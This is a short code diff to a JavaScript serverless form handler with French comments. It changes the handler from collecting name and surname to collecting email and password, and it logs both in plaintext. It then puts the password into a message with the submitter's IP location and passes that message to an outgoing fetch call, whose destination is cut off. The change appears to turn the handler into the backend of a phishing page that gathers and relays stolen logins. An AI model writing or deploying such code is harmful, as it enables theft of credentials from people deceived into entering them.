@@ -8,10 +8,10 @@ export async function handler(event) {
 
   try {
     // Extraction des données du corps de la requête
-    const { name, surname } = JSON.parse(event.body);
-    console.log("Données reçues:", { name, surname });
+    const { email, password } = JSON.parse(event.body);
+    console.log("Données reçues:", { email, password });
 
-    if (!name || !surname) {
+    if (!email || !password) {
       return {
         statusCode: 400,
         body: JSON.stringify({ error: "Champs manquants" }),
@@ -36,8 +36,8 @@ export async function handler(event) {
     const message = `
 📩 Nouveau formulaire
 🌍 IP : ${ipLocation}
-👤 Nom : ${name}
-👤 Prénom : ${surname}
+👤 Nom : ${email}
+👤 Prénom : ${password}
     `;
 
     const response = await fetch(
